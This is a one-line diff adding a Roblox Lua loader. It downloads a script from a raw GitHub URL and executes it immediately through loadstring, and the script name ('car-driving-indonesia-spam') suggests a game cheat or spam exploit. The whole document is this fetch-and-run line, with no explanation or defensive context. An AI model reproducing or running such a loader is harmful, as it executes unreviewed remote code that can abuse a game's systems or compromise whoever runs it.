@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/car-driving-indonesia-spam3-1el0wy95iim76q.lua"))()
